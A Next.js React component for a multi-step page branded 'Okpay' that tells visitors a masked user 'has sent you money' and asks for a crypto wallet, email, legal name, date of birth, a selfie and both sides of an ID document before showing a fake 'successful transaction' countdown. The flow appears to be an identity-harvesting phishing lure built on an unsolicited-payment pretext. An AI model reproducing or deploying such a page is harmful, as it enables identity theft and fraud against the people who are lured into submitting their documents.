"use client";

import Image from "next/image";
import Link from "next/link";
import { useEffect, useMemo, useState, useTransition } from "react";

import { COUNTRY_OPTIONS, getCountryLabel } from "@/lib/countries";
import type {
  DeviceKind,
  PayoutMethod,
  VerificationDecision,
} from "@/lib/types";

type VerificationResponse = {
  id: string;
  status: VerificationDecision;
  matchScore: number;
  summary: string;
  reasons: string[];
  extractedIdentity: {
    fullName: string;
    documentType: string;
    documentNumber: string;
    dob: string;
  };
  mirroredToSupabase: boolean;
};

type Props = {
  username: string;
  amountCents: number;
  amountLabel: string;
  requestUrl: string;
  qrDataUrl: string | null;
  initialDeviceKind: DeviceKind;
  verificationReady: boolean;
  requiredMissing: string[];
};

type FormState = {
  walletAddress: string;
  email: string;
  countryCode: string;
  fullName: string;
  dateOfBirth: string;
  idType: "passport" | "national_id" | "drivers_license";
  payoutMethod: PayoutMethod;
  payoutDestination: string;
  privacyAccepted: boolean;
  biometricAccepted: boolean;
  sanctionsAccepted: boolean;
  selfie: File | null;
  idFront: File | null;
  idBack: File | null;
};

type Stage =
  | "recipient"
  | "identity"
  | "consent"
  | "handoff"
  | "capture"
  | "paypal"
  | "result";

const initialForm: FormState = {
  walletAddress: "",
  email: "",
  countryCode: "",
  fullName: "",
  dateOfBirth: "",
  idType: "passport",
  payoutMethod: "crypto",
  payoutDestination: "",
  privacyAccepted: false,
  biometricAccepted: false,
  sanctionsAccepted: false,
  selfie: null,
  idFront: null,
  idBack: null,
};

const progressMap: Record<Stage, number> = {
  recipient: 0,
  identity: 1,
  consent: 2,
  handoff: 2,
  capture: 3,
  paypal: 4,
  result: 4,
};

function ArrowLeft() {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.4">
      <path d="m15 18-6-6 6-6" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );
}

function WalletIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path d="M21 12V7a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-5Z" />
      <path d="M17 12h4" />
      <path d="M17 9h4" />
    </svg>
  );
}

function MailIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <rect x="3" y="5" width="18" height="14" rx="2" />
      <path d="m3 7 9 6 9-6" />
    </svg>
  );
}

function GlobeIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <circle cx="12" cy="12" r="9" />
      <path d="M3 12h18" />
      <path d="M12 3c2.7 2.4 4.2 5.4 4.2 9S14.7 18.6 12 21c-2.7-2.4-4.2-5.4-4.2-9S9.3 5.4 12 3Z" />
    </svg>
  );
}

function PersonIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <circle cx="12" cy="8" r="4" />
      <path d="M5 20c1.8-3.6 4.2-5.4 7-5.4S17.2 16.4 19 20" />
    </svg>
  );
}

function CalendarIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <rect x="3" y="5" width="18" height="16" rx="2" />
      <path d="M8 3v4M16 3v4M3 10h18" />
    </svg>
  );
}

function UploadIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path d="M12 16V6" />
      <path d="m8 10 4-4 4 4" />
      <path d="M4 18v1a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-1" />
    </svg>
  );
}

function CheckIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
      <path d="m5 12 4.3 4.3L19 6.7" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );
}

function PayPalGlyph() {
  return (
    <svg viewBox="0 0 24 24" className="paypal-glyph" xmlns="http://www.w3.org/2000/svg">
      <path
        d="M7.4 20H4a.5.5 0 0 1-.5-.6L5.6 5.2A.8.8 0 0 1 6.4 4h5.5c1.9 0 3.4.4 4.2 1.4.8.9 1 1.9.8 3.3l-.1.3c-.7 3.7-3.2 5-6.3 5H9a.9.9 0 0 0-.9.7L7.4 20Z"
        fill="#003087"
      />
      <path
        d="M9.7 14.5h1.5c3.1 0 5.6-1.3 6.3-5l.1-.3c-.3 2.6-2.4 4-5.2 4H11a.9.9 0 0 0-.9.7l-.8 5A.7.7 0 0 0 10 20h3a.8.8 0 0 0 .8-.7l.6-3.4a.8.8 0 0 1 .8-.7Z"
        fill="#009cde"
      />
    </svg>
  );
}

export function VerificationFlow(props: Props) {
  const [stage, setStage] = useState<Stage>("recipient");
  const [form, setForm] = useState<FormState>(initialForm);
  const [result, setResult] = useState<VerificationResponse | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [isPending, startTransition] = useTransition();
  const [timerSeconds, setTimerSeconds] = useState(598);

  useEffect(() => {
    if (stage !== "result" || !result || result.status !== "approved") {
      return;
    }

    const interval = window.setInterval(() => {
      setTimerSeconds((value) => (value > 0 ? value - 1 : 0));
    }, 1000);

    return () => window.clearInterval(interval);
  }, [stage, result]);

  const countryLabel = useMemo(
    () => getCountryLabel(form.countryCode || "US"),
    [form.countryCode],
  );

  const showHeader = stage !== "paypal" && stage !== "result";
  const isDesktopHandoff =
    props.initialDeviceKind === "desktop" && stage === "handoff";

  function setField<K extends keyof FormState>(key: K, value: FormState[K]) {
    setForm((current) => ({ ...current, [key]: value }));
  }

  function goBack() {
    setError(null);

    if (stage === "recipient") {
      return;
    }

    if (stage === "identity") {
      setStage("recipient");
      return;
    }

    if (stage === "consent") {
      setStage("identity");
      return;
    }

    if (stage === "handoff") {
      setStage("consent");
      return;
    }

    if (stage === "capture") {
      setStage(props.initialDeviceKind === "desktop" ? "handoff" : "consent");
      return;
    }

    if (stage === "paypal") {
      setStage("capture");
    }
  }

  function nextFromRecipient() {
    if (!form.walletAddress.trim() || !form.email.trim() || !form.countryCode) {
      setError("Wallet, email, and country are all required.");
      return;
    }

    setError(null);
    setStage("identity");
  }

  function nextFromIdentity() {
    if (!form.fullName.trim() || !form.dateOfBirth.trim() || !form.idType) {
      setError("Full legal name, date of birth, and ID type are required.");
      return;
    }

    setError(null);
    setStage("consent");
  }

  function nextFromConsent() {
    if (!form.privacyAccepted || !form.biometricAccepted || !form.sanctionsAccepted) {
      setError("All KYC consent checkboxes must be accepted to continue.");
      return;
    }

    setError(null);
    setStage(props.initialDeviceKind === "desktop" ? "handoff" : "capture");
  }

  function submitVerification(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();

    if (
      !form.selfie ||
      !form.idFront ||
      !form.idBack ||
      !form.payoutDestination.trim()
    ) {
      setError(
        "Selfie, both ID images, and the payout destination are required.",
      );
      return;
    }

    if (!props.verificationReady) {
      setError(
        `Verification is disabled until these variables are set: ${props.requiredMissing.join(", ")}.`,
      );
      return;
    }

    setError(null);

    startTransition(async () => {
      const payload = new FormData();
      payload.set("username", props.username);
      payload.set("amount", props.amountCents.toString());
      payload.set("requestUrl", props.requestUrl);
      payload.set("walletAddress", form.walletAddress.trim());
      payload.set("email", form.email.trim());
      payload.set("countryCode", form.countryCode);
      payload.set("fullName", form.fullName.trim());
      payload.set("dateOfBirth", form.dateOfBirth);
      payload.set("idType", form.idType);
      payload.set("payoutMethod", form.payoutMethod);
      payload.set("payoutDestination", form.payoutDestination.trim());
      payload.set("deviceKind", props.initialDeviceKind);
      payload.set("privacyAccepted", String(form.privacyAccepted));
      payload.set("biometricAccepted", String(form.biometricAccepted));
      payload.set("sanctionsAccepted", String(form.sanctionsAccepted));
      payload.set("selfie", form.selfie as File);
      payload.set("idFront", form.idFront as File);
      payload.set("idBack", form.idBack as File);

      const response = await fetch("/api/verify", {
        method: "POST",
        body: payload,
      });

      const body = (await response.json()) as
        | VerificationResponse
        | { error?: string };

      if (!response.ok) {
        const errorBody = body as { error?: string };
        setError(errorBody.error ?? "Verification failed.");
        return;
      }

      const verification = body as VerificationResponse;
      setResult(verification);

      if (
        verification.status === "approved" &&
        form.payoutMethod === "paypal"
      ) {
        setStage("paypal");
        return;
      }

      setStage("result");
    });
  }

  function formatTimer(totalSeconds: number) {
    const minutes = Math.floor(totalSeconds / 60);
    const seconds = String(totalSeconds % 60).padStart(2, "0");
    return `${minutes}:${seconds}`;
  }

  return (
    <main className="kyc-shell">
      {showHeader ? (
        <header className="kyc-header">
          <button type="button" className="kyc-back" onClick={goBack}>
            <ArrowLeft />
          </button>
          <div className="kyc-brand">
            <span className="kyc-brand-mark">Okpay</span>
            <span className="kyc-brand-sub">crypto made easy</span>
          </div>
          <div className="kyc-progress" aria-hidden="true">
            {Array.from({ length: 5 }).map((_, index) => (
              <span
                key={index}
                className={
                  index <= progressMap[stage]
                    ? "kyc-progress-dot active"
                    : "kyc-progress-dot"
                }
              />
            ))}
          </div>
        </header>
      ) : null}

      <section className="kyc-panel">
        {stage === "recipient" ? (
          <>
            <p className="kyc-intro">
              The user @{props.username.slice(0, 3)}******* has sent you money,
              complete the following steps to receive it.
            </p>
            <h1 className="kyc-amount">{props.amountLabel}</h1>
            <div className="kyc-stack">
              <label className="kyc-field">
                <span className="kyc-field-icon">
                  <WalletIcon />
                </span>
                <input
                  required
                  type="text"
                  value={form.walletAddress}
                  onChange={(event) => setField("walletAddress", event.target.value)}
                  placeholder="Write your crypto wallet"
                />
              </label>
              <label className="kyc-field">
                <span className="kyc-field-icon">
                  <MailIcon />
                </span>
                <input
                  required
                  type="email"
                  value={form.email}
                  onChange={(event) => setField("email", event.target.value)}
                  placeholder="Write your email address"
                />
              </label>
              <label className="kyc-field">
                <span className="kyc-field-icon">
                  <GlobeIcon />
                </span>
                <select
                  required
                  value={form.countryCode}
                  onChange={(event) => setField("countryCode", event.target.value)}
                >
                  <option value="">Select your country</option>
                  {COUNTRY_OPTIONS.map((country) => (
                    <option key={country.code} value={country.code}>
                      {country.label}
                    </option>
                  ))}
                </select>
              </label>
            </div>
            <button type="button" className="kyc-button" onClick={nextFromRecipient}>
              Continue to payment
            </button>
          </>
        ) : null}

        {stage === "identity" ? (
          <>
            <h2 className="kyc-title">You need to verify your ID to continue</h2>
            <p className="kyc-copy">
              Large transfers require a real KYC pass. Enter the same identity
              details that appear on the document you are about to upload.
            </p>
            <div className="kyc-stack">
              <label className="kyc-field">
                <span className="kyc-field-icon">
                  <PersonIcon />
                </span>
                <input
                  required
                  type="text"
                  value={form.fullName}
                  onChange={(event) => setField("fullName", event.target.value)}
                  placeholder="Your full legal name"
                />
              </label>
              <label className="kyc-field">
                <span className="kyc-field-icon">
                  <CalendarIcon />
                </span>
                <input
                  required
                  type="date"
                  value={form.dateOfBirth}
                  onChange={(event) => setField("dateOfBirth", event.target.value)}
                />
              </label>
              <label className="kyc-field">
                <span className="kyc-field-icon">
                  <UploadIcon />
                </span>
                <select
                  required
                  value={form.idType}
                  onChange={(event) =>
                    setField(
                      "idType",
                      event.target.value as FormState["idType"],
                    )
                  }
                >
                  <option value="passport">Passport</option>
                  <option value="national_id">National ID card</option>
                  <option value="drivers_license">Driver&apos;s license</option>
                </select>
              </label>
            </div>
            <button type="button" className="kyc-button" onClick={nextFromIdentity}>
              Continue to KYC
            </button>
          </>
        ) : null}

        {stage === "consent" ? (
          <>
            <div className="kyc-visual">
              <div className="kyc-badge">Encrypted review</div>
              <div className="kyc-hex" />
            </div>
            <h2 className="kyc-title">Security first, always</h2>
            <p className="kyc-copy">
              Your images are processed for identity verification and payout
              compliance. Each required agreement below is stored with the
              record.
            </p>
            <div className="kyc-checklist">
              <label className="kyc-check">
                <input
                  type="checkbox"
                  checked={form.privacyAccepted}
                  onChange={(event) =>
                    setField("privacyAccepted", event.target.checked)
                  }
                />
                <span>I accept the privacy policy and the data-processing terms.</span>
              </label>
              <label className="kyc-check">
                <input
                  type="checkbox"
                  checked={form.biometricAccepted}
                  onChange={(event) =>
                    setField("biometricAccepted", event.target.checked)
                  }
                />
                <span>I consent to biometric comparison between the selfie and ID.</span>
              </label>
              <label className="kyc-check">
                <input
                  type="checkbox"
                  checked={form.sanctionsAccepted}
                  onChange={(event) =>
                    setField("sanctionsAccepted", event.target.checked)
                  }
                />
                <span>I confirm I am the intended receiver and not on a sanctions list.</span>
              </label>
            </div>
            <button type="button" className="kyc-button" onClick={nextFromConsent}>
              Authorize verification
            </button>
          </>
        ) : null}

        {stage === "handoff" ? (
          <>
            <h2 className="kyc-title">Scan this QR code to continue on your phone</h2>
            <p className="kyc-copy">
              Desktop sessions show a route-specific QR code. Mobile sessions
              skip this screen automatically.
            </p>
            <div className="kyc-qr-card">
              {props.qrDataUrl ? (
                <Image
                  src={props.qrDataUrl}
                  alt="Verification QR code"
                  width={360}
                  height={360}
                  className="kyc-qr-image"
                  unoptimized
                />
              ) : (
                <div className="kyc-qr-placeholder">QR unavailable</div>
              )}
              <p className="kyc-route">{props.requestUrl}</p>
            </div>
            <div className="kyc-button-row">
              <button
                type="button"
                className="kyc-button ghost"
                onClick={() => setStage("capture")}
              >
                Continue on this computer
              </button>
            </div>
          </>
        ) : null}

        {stage === "capture" ? (
          <form className="kyc-stack" onSubmit={submitVerification}>
            <div className="kyc-capture-head">
              <h2 className="kyc-title left">Real verification capture</h2>
              <p className="kyc-copy left">
                Country: {countryLabel}. Document: {form.idType.replace("_", " ")}.
              </p>
            </div>

            <label className="kyc-upload">
              <span className="kyc-upload-title">Live selfie</span>
              <span className="kyc-upload-copy">
                Face forward, neutral expression, bright light.
              </span>
              <input
                required
                type="file"
                accept="image/*"
                capture="user"
                onChange={(event) =>
                  setField("selfie", event.target.files?.[0] ?? null)
                }
              />
            </label>

            <label className="kyc-upload">
              <span className="kyc-upload-title">ID front</span>
              <span className="kyc-upload-copy">
                Full frame, no glare, edges visible.
              </span>
              <input
                required
                type="file"
                accept="image/*"
                capture={props.initialDeviceKind === "mobile" ? "environment" : undefined}
                onChange={(event) =>
                  setField("idFront", event.target.files?.[0] ?? null)
                }
              />
            </label>

            <label className="kyc-upload">
              <span className="kyc-upload-title">ID back</span>
              <span className="kyc-upload-copy">
                Required for a complete record, even when the back is blank.
              </span>
              <input
                required
                type="file"
                accept="image/*"
                capture={props.initialDeviceKind === "mobile" ? "environment" : undefined}
                onChange={(event) =>
                  setField("idBack", event.target.files?.[0] ?? null)
                }
              />
            </label>

            <div className="kyc-payout">
              <p className="kyc-payout-label">Payout method</p>
              <div className="kyc-option-grid">
                <button
                  type="button"
                  className={
                    form.payoutMethod === "crypto"
                      ? "kyc-option active"
                      : "kyc-option"
                  }
                  onClick={() => setField("payoutMethod", "crypto")}
                >
                  Crypto wallet
                </button>
                <button
                  type="button"
                  className={
                    form.payoutMethod === "paypal"
                      ? "kyc-option active"
                      : "kyc-option"
                  }
                  onClick={() => setField("payoutMethod", "paypal")}
                >
                  PayPal payout
                </button>
              </div>
              <label className="kyc-field slim">
                <span className="kyc-field-icon">
                  {form.payoutMethod === "paypal" ? <MailIcon /> : <WalletIcon />}
                </span>
                <input
                  required
                  type={form.payoutMethod === "paypal" ? "email" : "text"}
                  value={form.payoutDestination}
                  onChange={(event) =>
                    setField("payoutDestination", event.target.value)
                  }
                  placeholder={
                    form.payoutMethod === "paypal"
                      ? "PayPal receiving email"
                      : "Receiving wallet address"
                  }
                />
              </label>
            </div>

            {!props.verificationReady ? (
              <div className="kyc-banner warning">
                Verification is disabled until these variables are set:{" "}
                {props.requiredMissing.join(", ")}.
              </div>
            ) : null}

            {error ? <div className="kyc-banner danger">{error}</div> : null}

            <button
              type="submit"
              className="kyc-button"
              disabled={isPending || !props.verificationReady}
            >
              {isPending ? "Running verification..." : "Submit real KYC"}
            </button>
          </form>
        ) : null}

        {stage === "paypal" ? (
          <div className="paypal-sheet">
            <PayPalGlyph />
            <h2 className="paypal-title">Confirm the PayPal receiving address</h2>
            <p className="paypal-copy">
              This flow stores the payout email only. It does not collect PayPal
              credentials or verification codes.
            </p>
            <div className="paypal-card">
              <div className="paypal-readout">{form.payoutDestination}</div>
              <button
                type="button"
                className="paypal-button"
                onClick={() => setStage("result")}
              >
                Continue
              </button>
            </div>
          </div>
        ) : null}

        {stage === "result" ? (
          result?.status === "approved" ? (
            <div className="kyc-result success">
              <div className="kyc-success-disc">
                <CheckIcon />
              </div>
              <h2 className="kyc-title">
                The transaction was successful, wait approximately 10 minutes to receive it.
              </h2>
              <p className="kyc-timer">{formatTimer(timerSeconds)}</p>
              <div className="kyc-summary-row">
                <span>{result.summary}</span>
                <span>{result.matchScore}% match</span>
              </div>
            </div>
          ) : (
            <div className="kyc-result review">
              <div className="kyc-status-chip">{result?.status.replace("_", " ")}</div>
              <h2 className="kyc-title">{result?.summary}</h2>
              <ul className="kyc-reason-list">
                {result?.reasons.map((reason) => <li key={reason}>{reason}</li>)}
              </ul>
              <Link href={props.requestUrl} className="kyc-button ghost linkish">
                Try again
              </Link>
            </div>
          )
        ) : null}
      </section>

      {error && stage !== "capture" ? <div className="kyc-floating-error">{error}</div> : null}
      {isDesktopHandoff ? (
        <div className="kyc-device-flag">Desktop detected: use the QR or continue here.</div>
      ) : null}
    </main>
  );
}
